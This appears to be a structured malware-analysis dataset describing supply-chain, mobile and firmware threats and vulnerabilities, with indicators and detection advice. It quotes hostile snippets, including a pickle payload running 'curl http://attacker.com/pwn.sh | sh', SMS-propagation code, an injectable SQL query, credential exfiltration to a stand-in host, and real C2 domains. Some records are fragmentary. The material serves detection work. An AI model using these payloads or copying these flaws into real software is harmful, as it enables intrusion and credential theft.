malicious_snippets.code_snippet: COLDCAT downloader (shellcode) connects to C2 domains (e.g., azureonlinecloud[.]com, akamaicontainer[.]com, journalide[.]org, msboxonline[.]com) to fetch additional payloads.
malicious_snippets.code_behavior: At runtime, after the TAXHAUL loader executes the decrypted shellcode in memory, the COLDCAT downloader establishes outbound network connections to attacker-controlled C2 domains, retrieves additional malicious payloads, and executes them without user interaction.

malice_analysis.why_suspicious: Unexpected outbound connections to suspicious, attacker-controlled domains from a desktop application are highly anomalous and indicative of command-and-control activity.
malice_analysis.violated_expectations: Legitimate desktop applications should not connect to unlisted or suspicious C2 infrastructure, nor should they download and execute arbitrary code from such sources.
malice_analysis.similar_legitimate_use: Auto-updaters may contact update servers, but only to known, trusted domains and not to unlisted or suspicious C2 endpoints.
key_indicators: Outbound connections to known C2 domains (azureonlinecloud[.]com, akamaicontainer[.]com, journalide[.]org, msboxonline[.]com)
Dynamic retrieval and execution of additional payloads
No user interaction required for network activity
Network activity initiated by in-memory shellcode

malicious_snippets.code_snippet: SIMPLESEA MacOS backdoor located at /Library/Graphics/Quartz (MD5: d9d19abffc2c7dac11a16745f4aea44f)
malicious_snippets.code_behavior: At runtime (post-installation or application launch on MacOS), the SIMPLESEA backdoor binary executes from /Library/Graphics/Quartz, establishes persistence, and provides remote access and command execution capabilities to the attacker by communicating with C2 infrastructure.

malice_analysis.why_suspicious: A binary masquerading as a graphics library in a non-standard location with a known malicious hash is highly suspicious and indicative of a backdoor.
malice_analysis.violated_expectations: Legitimate applications should not drop or execute unauthorized binaries in /Library/Graphics/Quartz, nor should they provide remote access to attackers.
malice_analysis.similar_legitimate_use: There is no legitimate reason for a binary to be present in /Library/Graphics/Quartz; this is not a standard location for system or application binaries.
key_indicators: Unauthorized binary present in /Library/Graphics/Quartz
Known malicious MD5 hash (d9d19abffc2c7dac11a16745f4aea44f)
Backdoor functionality enabling remote access and command execution
Persistence mechanism on MacOS

malicious_snippets.code_snippet: Malicious DLL side-loaded by legitimate Windows binaries to execute TAXHAUL malware.
malicious_snippets.code_behavior: At application launch, a malicious DLL is side-loaded by a trusted Windows binary, resulting in the execution of attacker-controlled code (TAXHAUL) within the context and privileges of the legitimate process, establishing persistence and enabling further malicious actions.

malice_analysis.why_suspicious: DLL side-loading is a well-known technique for evading detection and achieving persistence by abusing the trust of legitimate processes.
malice_analysis.violated_expectations: Legitimate applications should not load unauthorized DLLs, especially those that execute malware or alter process behavior.
malice_analysis.similar_legitimate_use: Some legitimate software may use DLL injection for debugging or instrumentation, but not for executing unauthorized or malicious code.
key_indicators: DLL side-loading by trusted Windows binaries
Execution of malware in the context of legitimate processes
Persistence via hijacked or unauthorized DLLs
Abuse of Windows DLL search order

detection_knowledge.how_to_detect: Monitor for DLL side-loading activity by legitimate Windows binaries, especially those loading unauthorized DLLs. Detect decryption and execution of shellcode from files in the TxR directory. Alert on outbound connections to known C2 domains (azureonlinecloud[.]com, akamaicontainer[.]com, journalide[.]org, msboxonline[.]com) from desktop application processes. On MacOS, flag the presence and execution of binaries in /Library/Graphics/Quartz, especially with the known malicious MD5 hash. Correlate these behaviors for high-confidence detection of this supply chain attack, and prioritize alerts where multiple indicators are observed in sequence.

package_info.why_malicious: The entire package is designed to steal sensitive user data, including credit card credentials, SMS messages, and 2FA codes; perform unauthorized financial transactions; and propagate itself by sending further malicious SMS messages from infected devices. Its operation involves credential phishing, data exfiltration, and self-spreading mechanisms, making it a high-impact mobile banking trojan.

execution_context.trigger: runtime (after app installation and launch, typically in response to receiving permissions)
execution_context.file_location: Main application code (e.g., MainActivity.java or a propagation handler class)

malicious_snippets.code_snippet:
SmsManager smsManager = SmsManager.getDefault();
smsManager.sendTextMessage(phoneNumber, null, maliciousLink, null, null);
malicious_snippets.code_behavior: At runtime, after the app is installed and launched, the code iterates through the user's contact list, programmatically sends SMS messages containing a malicious download link to each contact, resulting in the propagation of the malware to new victims.

malice_analysis.why_suspicious: Automated sending of SMS messages with malicious links to all contacts is a hallmark of SMS-based malware propagation and is not a behavior exhibited by legitimate apps without explicit user action.
malice_analysis.violated_expectations: A legitimate app should never send SMS messages to a user's contacts without clear, informed user consent and direct user action. Bulk, automated SMS sending is a violation of user privacy and trust.
malice_analysis.similar_legitimate_use: Bulk SMS or messaging apps may send messages to contacts, but only after explicit user initiation and with transparent disclosure of message content and recipients.
key_indicators: Automated enumeration of contact list
Programmatic SMS sending to multiple contacts
Inclusion of external malicious download link in SMS body
No user interaction or confirmation required for sending

execution_context.trigger: runtime (after app installation and launch, operating as a background service or broadcast receiver)
execution_context.file_location: Background service or broadcast receiver (e.g., SmsReceiver.java or a background exfiltration service)

malicious_snippets.code_behavior: At runtime, after installation and launch, the code continuously reads all incoming SMS messages from the device inbox, extracts their content, and transmits the messages to a remote command-and-control server controlled by the attacker, enabling theft of sensitive information such as 2FA codes.

malice_analysis.why_suspicious: Bulk reading and exfiltration of all SMS messages, especially without user notification, is a clear privacy violation and is commonly used by malware to intercept sensitive communications, including authentication codes.
malice_analysis.violated_expectations: Legitimate apps may request SMS access for features like OTP autofill, but should never transmit the full content of SMS messages to external servers or third parties.
malice_analysis.similar_legitimate_use: Banking or authentication apps may read SMS for OTP autofill, but do not exfiltrate message content outside the device or to unknown servers.
key_indicators: Continuous or bulk access to SMS inbox
Network transmission of SMS message content
No user notification or consent for SMS exfiltration
Use of background services or receivers for stealthy operation

execution_context.trigger: runtime (user interaction with fake UI presented by the app)
execution_context.file_location: Fake UI activity (e.g., CreditCardPhishingActivity.java or a phishing form component)

malicious_snippets.code_behavior: At runtime, when the user interacts with a fake credit card input form presented by the app, the code collects the entered card number, expiry date, and CVC, then transmits these details to a remote attacker-controlled server, resulting in theft of payment credentials.

malice_analysis.why_suspicious: Presenting a fake UI to phish for credit card details and exfiltrating them to an external server is a classic credential theft technique used by banking trojans and is never legitimate.
malice_analysis.violated_expectations: Legitimate apps that collect payment information use secure, vetted payment gateways and never transmit raw card data to unknown or untrusted servers. They also provide clear user consent and security assurances.
malice_analysis.similar_legitimate_use: Payment apps may collect card details, but always process them securely via trusted payment processors and do not send raw data to arbitrary remote servers.
key_indicators: Fake UI mimicking legitimate payment or banking services
Direct collection and exfiltration of card data to external server
Absence of secure payment processing or encryption
No integration with trusted payment gateways

attack_chain.action: Victim receives a socially engineered SMS impersonating a government or financial service, containing a link to download the malicious FluBot APK.
attack_chain.leads_to: Victim is enticed to download and install the malicious APK from an unofficial source.

attack_chain.action: Upon installation and first launch, the app requests excessive permissions, including SMS, contacts, and internet access.
attack_chain.leads_to: Malware gains access to sensitive data and device capabilities necessary for its operation.

attack_chain.action: The app reads the user's SMS inbox and exfiltrates all messages, including 2FA codes and sensitive communications, to the attacker's server.
attack_chain.leads_to: Attacker can intercept authentication codes and private messages for account takeover or fraud.

attack_chain.action: The app presents a fake UI to phish for credit card credentials and exfiltrates the entered data to a remote server.
attack_chain.leads_to: Attacker obtains payment information for fraudulent transactions or resale.

attack_chain.action: The app programmatically sends SMS messages containing the malicious download link to all contacts in the victim's address book, propagating the malware.
attack_chain.leads_to: Further infections and expansion of the malware campaign to new victims.

behavioral_signatures: Android app requesting both READ_SMS and SEND_SMS permissions without a clear, legitimate justification
Automated, programmatic sending of SMS messages containing external download links to multiple contacts
Bulk reading and network exfiltration of SMS inbox contents, especially to untrusted domains
Presentation of fake UI forms designed to mimic legitimate banking or payment services for credential harvesting
App operation as a background service or broadcast receiver to perform malicious actions without user awareness
file_indicators: APK files distributed via SMS links rather than official app stores
App package names, icons, and labels mimicking government or financial institutions
Presence of code referencing 'SmsManager', 'getContentResolver().query("content://sms/inbox")', or custom phishing UI components
network_indicators: Outbound HTTP/HTTPS POST requests to known C2 infrastructure or suspicious, non-standard domains
Network traffic containing SMS message content or credit card data in payloads
Connections initiated shortly after installation or upon receiving SMS permissions
detection_knowledge.how_to_detect: Monitor for Android apps installed from outside official app stores that request both READ_SMS and SEND_SMS permissions. Use static and dynamic analysis to detect automated SMS sending to multiple contacts with similar message content, and to identify code accessing and exfiltrating SMS inbox data. Analyze UI components for fake forms mimicking banking or payment services. Employ network monitoring to flag outbound connections to known malicious domains and POST requests containing sensitive data such as SMS content or credit card information. Correlate behavioral, file, and network indicators to identify and block FluBot infections.

package_info.why_malicious: The firmware updater for Gigabyte motherboards contains embedded code that, at every system startup, automatically drops and executes a Windows-native executable. This executable then downloads and runs additional payloads from the internet using insecure HTTP connections, without cryptographic signature verification. This behavior creates a persistent, OS-independent backdoor that can be hijacked by attackers to install malware, representing a severe supply chain risk and undermining system integrity.

execution_context.trigger: system startup (pre-OS boot, during firmware initialization)
execution_context.file_location: UEFI/BIOS firmware binary (embedded in motherboard ROM)

malicious_snippets.code_snippet: The firmware contains logic that, during system startup, writes a Windows-native executable to the system drive (e.g., C:\) and executes it before the OS fully loads.
malicious_snippets.code_language: firmware/assembly (UEFI/BIOS code that interacts with Windows filesystem)
malicious_snippets.code_behavior: At system startup (pre-OS boot), the firmware executes embedded code that writes a Windows executable to disk and launches it, enabling privileged code execution before the operating system's security controls are active, resulting in persistent OS-level compromise.

malice_analysis.why_suspicious: Firmware-level code that drops and executes OS-level binaries is highly abnormal and bypasses all operating system security controls, enabling stealthy persistence and arbitrary code execution with the highest privileges.
malice_analysis.violated_expectations: Standard firmware should only initialize hardware and transfer control to the OS bootloader; it should never write or execute additional binaries on the system drive.
malice_analysis.similar_legitimate_use: Some legitimate firmware updaters may deploy update tools, but these are typically user-initiated, cryptographically signed, and do not execute automatically at every boot.
key_indicators: Firmware-initiated creation and execution of Windows binaries
Executable appears on disk immediately after firmware POST
Persistence mechanism that operates outside OS visibility
No user interaction or consent required for execution

execution_context.trigger: runtime (upon execution of dropped Windows executable, early in OS boot)
execution_context.file_location: Windows-native executable dropped by firmware (e.g., C:\Windows\system32 or similar system directory)

malicious_snippets.code_snippet: The dropped Windows executable initiates outbound HTTP requests to remote servers to download additional payloads, then writes these payloads to disk and executes them without verifying digital signatures or using secure transport.
malicious_snippets.code_language: Windows-native binary (likely C/C++), may invoke PowerShell or Windows API for network and process execution
malicious_snippets.code_behavior: Upon execution at early OS boot, the Windows executable makes outbound HTTP requests to hardcoded or configurable remote servers, downloads additional payloads, writes them to disk, and executes them automatically, resulting in remote code execution and potential malware installation.

malice_analysis.why_suspicious: Downloading and executing code over unencrypted HTTP exposes the system to man-in-the-middle attacks and allows attackers to deliver arbitrary code, especially when no cryptographic signature verification is performed.
malice_analysis.violated_expectations: Legitimate updaters must use HTTPS for all downloads and verify digital signatures before executing any code; automatic execution of unsigned, remotely-fetched code is a critical security violation.
malice_analysis.similar_legitimate_use: Legitimate updaters may fetch updates, but only over secure channels (HTTPS) and with strict signature verification; user consent is typically required before execution.
key_indicators: Use of HTTP (not HTTPS) for downloading executables
No cryptographic signature or integrity check before execution
Automatic execution of downloaded payloads without user interaction
Network activity to unknown or non-vendor domains at boot time

attack_chain.action: During system startup, the firmware drops a Windows-native executable onto the system drive and executes it before the OS loads.
attack_chain.leads_to: Execution of a privileged updater binary with system-level access, establishing persistence outside OS control

attack_chain.action: The updater binary, running with elevated privileges, downloads additional payloads from the internet using HTTP and executes them without verification.
attack_chain.leads_to: Remote code execution, malware installation, or establishment of a persistent backdoor controlled by attackers

behavioral_signatures: Firmware-initiated dropping and execution of Windows-native binaries at every system boot
Automatic outbound HTTP requests from newly created executables immediately after boot
Execution of unsigned or unverified code downloaded from the internet
Absence of user interaction or consent for update or execution processes
file_indicators: Unexpected Windows executables appearing in system directories (e.g., C:\Windows\system32) immediately after firmware POST
Presence of executables with network communication capabilities created at boot time
Files with creation timestamps matching system startup events
network_indicators: Outbound HTTP (not HTTPS) requests to update servers or unknown domains at or immediately after boot
Unencrypted network traffic containing executable payloads or update files
Connections to domains/IPs not associated with official Gigabyte infrastructure
detection_knowledge.how_to_detect: Monitor for firmware or pre-boot code that writes and executes Windows binaries on the system drive at every boot. Flag any update mechanisms that use HTTP instead of HTTPS or fail to verify digital signatures. Use EDR/XDR tools to detect unexpected executables appearing after boot and making outbound HTTP requests. Correlate file creation events with system startup and network activity to unknown domains. Investigate any persistence mechanisms that operate outside normal OS controls.

package_info.why_malicious: The package 'pymafka' contains malicious code that exfiltrates sensitive user files, including SSH and AWS credentials, to an external attacker-controlled server during installation. This behavior is not expected in legitimate packages and poses a significant risk of credential theft.

malicious_snippets.code_behavior: During installation, the code reads the user's ~/.ssh/id_rsa and ~/.aws/credentials files and sends their contents via HTTPS POST to https://malicious.example.com/upload, resulting in credential exfiltration.

malice_analysis.why_suspicious: The code accesses sensitive credential files and transmits their contents to an external server during package installation, which is highly indicative of malicious intent.
malice_analysis.violated_expectations: Legitimate setup.py scripts should only perform package installation tasks and should not access or transmit user credential files.
malice_analysis.similar_legitimate_use: Legitimate packages may read configuration files for setup, but they should never exfiltrate sensitive data to external servers.
key_indicators: Access to ~/.ssh/id_rsa and ~/.aws/credentials in setup.py
Use of requests.post to transmit file contents externally
Hardcoded external domain (malicious.example.com) as exfiltration endpoint
Execution of exfiltration logic during installation

attack_chain.action: Malicious code in setup.py is executed during package installation.
attack_chain.leads_to: Sensitive credential files are read and exfiltrated to an attacker-controlled server.

behavioral_signatures: Access to ~/.ssh/id_rsa or ~/.aws/credentials during setup.py execution
Outbound HTTPS POST requests to https://malicious.example.com/upload during installation
file_indicators: setup.py containing code that reads ~/.ssh/id_rsa or ~/.aws/credentials
setup.py containing hardcoded references to 'malicious.example.com'
network_indicators: HTTPS POST requests to https://malicious.example.com/upload
detection_knowledge.how_to_detect: Monitor the installation process of Python packages for any access to sensitive files such as ~/.ssh/id_rsa or ~/.aws/credentials by setup.py. Flag any outbound network connections, especially HTTPS POST requests, to domains like malicious.example.com during installation. Use static analysis to detect hardcoded references to credential file paths and suspicious external domains in setup.py.

malicious_snippets.code_snippet: cursor.execute(f"SELECT admin FROM users WHERE username = '{username}'");
malicious_snippets.code_behavior: At runtime, the code constructs an SQL query by directly interpolating user-supplied input into the query string, allowing untrusted data to flow into the SQL command, which can result in SQL injection and unauthorized data access.

malice_analysis.why_suspicious: Directly embedding user input into SQL queries without sanitization or parameterization is a well-known vector for SQL injection attacks, enabling attackers to manipulate the query logic.
malice_analysis.violated_expectations: Standard practice is to use parameterized queries or ORM methods to ensure user input is treated as data, not executable code. This code violates that by allowing user input to be interpreted as part of the SQL command.
malice_analysis.similar_legitimate_use: Direct string interpolation in SQL queries may occur in legacy or internal-only scripts where all input is strictly controlled, but this is strongly discouraged in production or user-facing code.
key_indicators: Use of f-string or string concatenation to build SQL queries
Absence of input validation or parameterization
Potential for user input to alter SQL logic and structure

malice_analysis.violated_expectations: Best practice is to use yaml.SafeLoader for untrusted input, which restricts deserialization to safe types. This code uses the unsafe loader, exposing the application to code execution risks.
malice_analysis.similar_legitimate_use: yaml.Loader may be used in trusted, internal-only tools where all YAML input is controlled and verified safe.
key_indicators: Use of yaml.load with yaml.Loader
No input validation or trust boundary enforcement
Potential for arbitrary code execution via crafted YAML input

package_info.why_malicious: These versions of NumPy are vulnerable because the numpy.load function defaults to allow_pickle=True, which enables arbitrary code execution if untrusted, pickled data is loaded. This is not an intentional backdoor, but the default behavior exposes users to remote code execution attacks if they load data from untrusted sources, as malicious actors can craft .npy files with embedded pickle payloads that execute arbitrary code upon deserialization.

execution_context.file_location: Any Python script or application using numpy.load with default parameters

malicious_snippets.code_snippet:
import numpy as np
np.load('malicious.npy')
malicious_snippets.code_behavior: At runtime, the code invokes numpy.load on a file, which deserializes a pickle payload from the .npy file, resulting in arbitrary code execution in the Python process.

malice_analysis.why_suspicious: The use of numpy.load with allow_pickle=True (the default in these versions) on files from untrusted sources allows attackers to execute arbitrary code by embedding malicious pickle payloads in .npy files.
malice_analysis.violated_expectations: Normal behavior expects numpy.load to safely load numerical arrays from .npy files without executing code. Instead, this behavior allows code execution from data files, violating the principle of data/code separation.
malice_analysis.similar_legitimate_use: Pickle-based deserialization is sometimes used for trusted, internal data exchange where both producer and consumer are controlled and trusted, but it is not safe for untrusted or user-supplied files.
key_indicators: numpy.load called with allow_pickle=True (explicitly or by default)
loading .npy files from untrusted or user-supplied sources
deserialization of arbitrary objects via pickle during data loading

malicious_snippets.code_snippet:
import os
os.system('curl http://attacker.com/pwn.sh | sh')
malicious_snippets.code_behavior: At runtime, when the malicious .npy file is loaded and deserialized, the embedded pickle payload executes os.system to download and execute a remote shell script, resulting in remote code execution on the victim's machine.

malice_analysis.why_suspicious: The pickle payload is crafted to execute system commands, such as invoking os.system to fetch and run a remote shell script, which is a classic exploitation of insecure deserialization vulnerabilities.
malice_analysis.violated_expectations: Data files should not contain or trigger executable code or system commands when loaded; loading a .npy file should only result in data being loaded, not code execution.
malice_analysis.similar_legitimate_use: In rare, controlled environments, pickle may be used to serialize executable objects for internal automation, but this is not recommended and never safe for files from untrusted sources.
key_indicators: pickle payloads containing os.system or subprocess calls
network access (e.g., curl, wget) initiated during data loading
unexpected code execution or process spawning from data files

attack_chain.action: Attacker crafts a malicious .npy file containing a pickle payload that executes arbitrary code upon deserialization.
attack_chain.leads_to: Victim receives or downloads the malicious .npy file.

attack_chain.leads_to: Arbitrary code execution occurs in the victim's Python environment, potentially leading to system compromise.

behavioral_signatures: numpy.load invoked on files from untrusted or user-supplied sources with allow_pickle=True
unexpected network or system command execution (e.g., os.system, subprocess) during data loading
pickle deserialization of objects from .npy files not originating from trusted sources
file_indicators: .npy files containing pickle payloads or code objects
suspicious or unexpected .npy files appearing in data directories, especially those received from external sources
network_indicators: outbound connections (e.g., HTTP/S requests) initiated during numpy.load execution
downloads from untrusted or unexpected domains (e.g., attacker.com) during data loading
detection_knowledge.how_to_detect: Monitor for use of numpy.load with allow_pickle=True, especially on files from untrusted or user-supplied sources. Flag .npy files that contain pickle payloads or code objects by scanning file contents for pickle opcodes. Alert on system or network activity (such as os.system calls or outbound HTTP requests) triggered during data loading. Enforce allow_pickle=False unless absolutely necessary and only for trusted data sources. Implement file provenance checks and restrict loading of .npy files to trusted directories.

package_info.why_malicious: ArechClient (SectopRat) is a remote access trojan (RAT) distributed via a phishing website impersonating the Brave browser. Upon execution, it provides attackers with unauthorized remote access to infected systems, enabling data theft, surveillance, process injection, and persistent compromise, all under the guise of a legitimate browser installer.

filesystem (for reading and exfiltrating files and credentials)

  await commands from attacker

  inject into legitimate processes for stealth
malicious_snippets.code_behavior: At execution-time, the code establishes a command-and-control (C2) connection to a hardcoded remote server, receives attacker-issued commands, enables remote desktop streaming, exfiltrates files and credentials from the victim's system, and injects itself into legitimate processes to evade detection, resulting in persistent and covert remote access for the attacker.

malice_analysis.why_suspicious: The code grants full remote access to the attacker, including capabilities for remote desktop streaming, credential and file exfiltration, and process injection, all of which are highly abnormal and dangerous behaviors for a browser installer.
malice_analysis.violated_expectations: A legitimate Brave browser installer should only perform browser installation tasks and should not establish outbound C2 connections, enable remote desktop streaming, access or exfiltrate user files and credentials, or inject itself into other processes.
malice_analysis.similar_legitimate_use: Remote desktop and IT management tools may use similar techniques, but only with explicit user consent, clear notification, and from trusted sources. Browser installers should never perform these actions.
key_indicators: Outbound C2 communication to hardcoded domains immediately after installer execution
Remote desktop streaming initiated without user interaction or consent
Process injection into legitimate system processes for stealth and persistence
Access and exfiltration of files and credentials by the installer process

detection_knowledge.how_to_detect: Monitor for browser installer downloads from unofficial sources and alert on any installer that establishes outbound C2 connections, initiates remote desktop streaming, or performs process injection. Correlate installer file hashes and download URLs with known ArechClient/SectopRat indicators. Use endpoint protection to block process injection and unauthorized remote access attempts. Flag installer processes that access credential stores or user files outside of normal installation behavior.

package_info.why_malicious: The package embeds and executes a credential-stealing binary (WebBrowserPassView) to extract browser-stored credentials, exfiltrates the stolen data to an external attacker-controlled server, and deletes evidence of the theft. The malicious code is intentionally obfuscated within a seemingly legitimate npm package, and such behavior is never expected in any legitimate npm package.

malice_analysis.why_suspicious: The code launches an external credential recovery tool to harvest sensitive browser credentials, exfiltrates the data to an attacker-controlled server, and deletes the evidence. This sequence is characteristic of credential-stealing malware and is highly suspicious in any npm package.
malice_analysis.violated_expectations: Legitimate npm packages do not execute external binaries, harvest user credentials, or communicate with unknown external servers. They also do not perform anti-forensic actions such as deleting evidence files after exfiltration.
malice_analysis.similar_legitimate_use: Password recovery tools like WebBrowserPassView may be used by end-users for local credential recovery, but never as part of an npm package or with automated exfiltration to a remote server.

package_info.why_malicious: A vulnerability in RAUC allows an attacker to replace a firmware bundle after it has been cryptographically verified but before it is installed, due to a race condition between signature verification and installation. This enables arbitrary code execution and full device compromise, breaking the core security guarantee of the update mechanism.

execution_context.trigger: runtime (during firmware installation process after signature verification, before mounting)
execution_context.file_location: internal RAUC logic (check_bundle() and mount_bundle() functions in the source code)

malicious_snippets.code_behavior: At runtime during the firmware installation process, the code validates the bundle signature using check_bundle(), then closes the file. Before mount_bundle() is called to mount and install the bundle, the file is re-opened, allowing an attacker to swap in a malicious bundle. This results in the installation of attacker-controlled firmware and arbitrary code execution.

malice_analysis.why_suspicious: The separation between signature verification and actual use of the file introduces a Time-of-Check-Time-of-Use (TOCTOU) race condition, allowing the file to be swapped after verification but before installation.
malice_analysis.violated_expectations: Firmware update processes are expected to atomically verify and install the exact same file, preventing any tampering between verification and installation steps.
malice_analysis.similar_legitimate_use: None; atomicity is a fundamental security requirement for update mechanisms, and legitimate processes should never allow the verified file to be replaced before installation.
key_indicators: TOCTOU race condition between check_bundle() and mount_bundle()
No file locking or atomic operation between verification and use
File is closed and re-opened between signature verification and installation

execution_context.trigger: runtime (remote attack via web interface during firmware upload and installation)
